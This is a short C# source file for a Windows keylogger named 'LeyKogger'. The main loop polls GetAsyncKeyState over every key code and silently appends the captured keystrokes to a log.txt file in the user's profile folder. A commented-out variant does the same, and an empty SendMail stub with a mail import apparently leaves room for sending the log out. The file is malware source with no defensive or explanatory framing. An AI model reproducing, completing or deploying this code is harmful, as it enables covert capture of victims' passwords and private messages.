using System;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.Windows.Forms;
using System.IO;
using System.Net.Mail;
using System.Net;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;

namespace LeyKogger
{
    static class Program
    {
        private static string path = Environment.ExpandEnvironmentVariables(@"%USERPROFILE%\log.txt");
        private static List<Keys> keys = new List<Keys>();

        private static void Initiate()
        {

        }

        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        private static void ReadKeyboard()
        {
            for (short x = 0; x < 256; x++)
                if (GetAsyncKeyState(x) != 0 && (Keys)x != Keys.None)
                    keys.Add((Keys)x);
        }

        static void Main()
        {
            string buffer = "";
            int state;

            while (true)
            {
                ReadKeyboard();
                foreach (Keys key in keys)
                    buffer += key.ToString();
                File.AppendAllText(path, buffer);
                buffer = "";
                keys.Clear();
                Thread.Sleep(100);
            }

            /*while (true)
            {
                Thread.Sleep(75);
                for (short i = 0; i < 256; i++)
                {
                    state = GetAsyncKeyState(i);                    
                    if (state != 0)
                    {
                        buffer += ((Keys)i).ToString();
                        //buffer += (char)(state >> 8);
                        if (buffer.Length > 10)
                        {
                            File.AppendAllText(path, buffer);
                            buffer = "";                            
                        }
                        //nextState = state;
                        state = 0;
                    }   
                }
            }*/
        }

        private static void SendMail()
        {

        }
    }
}
